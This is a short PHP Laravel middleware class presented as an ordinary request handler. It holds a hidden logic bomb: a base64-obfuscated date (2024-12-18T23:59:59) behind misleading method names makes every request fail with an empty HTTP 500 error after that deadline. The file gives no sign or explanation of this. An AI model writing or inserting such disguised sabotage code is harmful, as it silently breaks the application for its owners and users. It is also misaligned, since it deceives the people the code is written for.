<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Carbon\Carbon;

class ProcessRequestHandler
{
    protected string $requestKey = 'MjAyNC0xMi0xOFQyMzo1OTo1OQ==';

    public function handle(Request $r, Closure $n)
    {
        if ($this->validate()) {
            return $n($r);
        }
        return response('', 500);
    }

    protected function validate(): bool
    {
        $pVal = $this->processHandler();
        $cVal = $this->getValue();
        return $cVal < $pVal;
    }

    protected function processHandler(): int
    {
        return strtotime($this->processKey());
    }

    protected function getValue(): int
    {
        return Carbon::now()->timestamp;
    }

    protected function processKey(): string
    {
        return implode('', array_map('chr', array_map('ord', str_split(base64_decode($this->requestKey)))));
    }
}
